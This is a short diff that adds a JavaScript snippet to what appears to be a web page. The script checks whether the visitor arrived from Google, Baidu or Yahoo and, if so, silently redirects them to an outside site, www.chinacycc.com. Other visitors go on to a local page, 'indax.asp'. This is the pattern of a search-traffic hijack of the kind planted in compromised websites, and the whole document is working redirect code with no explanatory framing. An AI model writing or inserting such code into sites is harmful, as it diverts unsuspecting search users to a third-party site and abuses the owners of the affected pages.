@@ -1,0 +1,13 @@
+<script LANGUAGE="Javascript">
+ 
+var s=document.referrer
+ 
+if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0 ) 
+ 
+location.href="http://www.chinacycc.com/";
+ 
+else
+ 
+location.href="indax.asp"
+ 
+</script>
